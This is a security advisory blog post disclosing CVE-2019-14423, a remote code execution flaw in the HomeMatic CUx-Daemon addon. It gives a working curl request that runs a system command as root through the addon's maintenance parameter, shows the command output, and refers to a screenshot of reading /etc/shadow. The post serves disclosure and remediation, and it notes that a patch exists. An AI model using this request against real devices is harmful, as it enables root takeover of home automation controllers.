---
layout: post
title: "Remote Code Execution in HomeMatic CUx-Daemon"
date: 2019-07-15 09:00:00
image:
      url: /assets/pixabay/matrix-1799659_1920.jpg
author: 'Joshua Lehr'
author_image: "https://avatars1.githubusercontent.com/u/22133182?s=400&u=9c37c0c25738af0b47f4b2ab1c3adb0b26f80abf&v=4"
author_link: "https://github.com/noskill1337"
cve: "CVE-2019-14423"
cve_description: "A Remote Code Execution (RCE) issue in the addon CUx-Daemon Version 1.5 of the HomeMatic CCU-Firmware 2.35.16 until 2.45.6 allows remote authenticated attackers to execute system commands as root remotely via a simple HTTP Request."
cve_affectedVersion: "CUx-Daemon Version 1.11a until 2.2.0"
cvss: "XX.XX"
softwarePatchLink: "[https://www.homematic-inside.de/blog/cuxd-in-der-version-2-3-0-erschienen?highlight=cuxd](https://www.homematic-inside.de/blog/cuxd-in-der-version-2-3-0-erschienen?highlight=cuxd)"
---

## Overview

- Vulnerability: Remote Code Execution (RCE)
- Vendor: Uwe Langhammer (Alex Krypthul)
- Vendor Homepage: [https://www.homematic-inside.de/software/cuxd](https://www.homematic-inside.de/software/cuxd)
- Product: HomeMatic Addon CUx-Daemon
- Testet on: CCU-Firmware 2.35.16 until 2.45.6 CUx-Daemon Version 1.11a
- Version: {{ page.cve_affectedVersion }}

## Background

HomeMatic is a home automation system consisting of various components for automating several parts of a building, including different sensors and actuators. The HomeMatic CCU2 is a central control unit, which is responsible for integrating these components with each other.

From the HomeMatic's [website](https://www.eq-3.com/products/homematic/control-units-and-gateways.html):
"Homematic devices can be connected to one another and programmed via the control units and gateways. The Homematic Central Control Unit CCU2 is responsible for numerous control, signalling and supervision functions across all areas of the Homematic system. The device includes a browser based user interface to the up the system. It can be controlled in the local network as well as via Internet. The Homematic software offers various configuration and application possibilities, so that there are no limits to creativity for installing your individual smart home..."

Link to the vulnerable [addon](https://www.homematic-inside.de/software/cuxd): This addon is compartible with CCU1, CCU2, CCU3 and RaspberryMatic. The issue can found on this systems as well.

## Issue Description

While analyzing the implementation of the home automation system HomeMatic, one Remote Code Execution (RCE) vulnerability has been identified, which can be exploited in order to execute system commands as root. The vulnerability is in the default CUx daemon add-on of CCU firmware 2.35.16 to 2.45.6.

![Affected Version](/assets/CVE-2019-14423/CVE-2019-14423.HomeMatic.Version.JPG)

This vulnerability can be exploited by authenticated attackers with access to the web interface to gain root privileges on the underlying linux system.

The following **bash command** illustrates this approach:

~~~ bash
curl -k http://192.168.0.125/addons/cuxd/index.ccc?pass=&maintenance=9&cmd=ifconfig
~~~

Output of the **bash command** command:

~~~ bash
eth0      Link encap:Ethernet  HWaddr 00:1B:1A:23:34:77  
          inet addr:192.168.0.125  Bcast:192.168.0.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2618068 errors:0 dropped:41512 overruns:0 frame:0
          TX packets:238524 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 tx:1000
          RX bytes:589432101 (562.1 MiB)  TX bytes:81696404 (77.9 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:7934360 errors:0 dropped:0 overruns:0 frame:0
          TX packets:7934360 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 tx:0
          RX bytes:2245939067 (2.0 GiB)  TX bytes:2245939067 (2.0 GiB)

usb0      Link encap:Ethernet  HWaddr 00:1B:1A:23:34:77  
          inet addr:10.103.80.44  Bcast:10.103.80.255  Mask:255.255.255.0
          UP BROADCAST MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 tx:1000
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
~~~

Output of an other **system command**:
![POC execute systemcall and read /etc/shadow file](/assets/CVE-2019-14423/CVE-2019-14423.HomeMatic.POC.JPG)

## Impact

This vulnerability affects the system's confidentiality / integrity / availability. This allows an attacker to read / manipulate the system data. If an attacker knows the security issue, he may steal important data or compromise the system.

## Remediation

In order to avoid this vulnerability, it's suggested to disable the addon:
**{{ page.cve_affectedVersion }}**

{%if page.softwarePatchLink %}{{ site.softwarePatchText }}{{ page.softwarePatchLink }}{% else %}{{ "" }}{% endif %}

## CVE

- CVE: [{{ page.cve }}](https://cve.mitre.org/cgi-bin/cvename.cgi?name={{ page.cve }})
- CVSS Base Score: **{{ page.cvss }}**
- CVSS: 3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

## Credit

- {{ site.owner }}

## Disclosure Timeline

- 2019-June-15: Discovered vulnerability
- 2019-June-16: Vendor Notification
- 2019-June-21: Vendor Fix/Patch
- 2019-Juli-15: Public Disclosure

## Disclaimer

The information provided is released "as is" without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information. In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.

System administrators need tools like this to discover vulnerable hosts. This tool is offered for legal purposes only and to forward the security community's understanding of this vulnerability. As this PoC actively exploits the vulnerability, do not use against targets without prior permission.

The contents of this advisory are copyright (c) 2019 {{ site.owner }} and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.

## License

{{ site.LicenseDisplay }}